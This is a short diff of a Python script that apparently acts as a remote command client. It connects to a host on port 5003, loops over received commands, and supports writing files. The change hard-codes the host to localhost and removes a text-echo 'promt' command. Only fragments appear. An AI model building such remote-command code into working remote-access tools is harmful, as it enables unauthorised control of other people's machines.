@@ -4,8 +4,7 @@ import subprocess
 import sys
 from tkinter import messagebox
 
-#HOST = "127.0.0.1"
-HOST = sys.argv[1]
+HOST = "127.0.0.1"
 
 PORT = 5003
 BUFFER_SIZE = 1024 * 128 
@@ -30,12 +29,7 @@ while True:
             output = str(e)
         else:
             output = ""
-
-    if splited_command[0].lower() == "promt":
-        p = ' '.join(splited_command[1:])
-        print(p)
-        output = p
-
+            
     if splited_command[0].lower() == "file":
         name = splited_command[1]
         with open(name,"w+") as f:
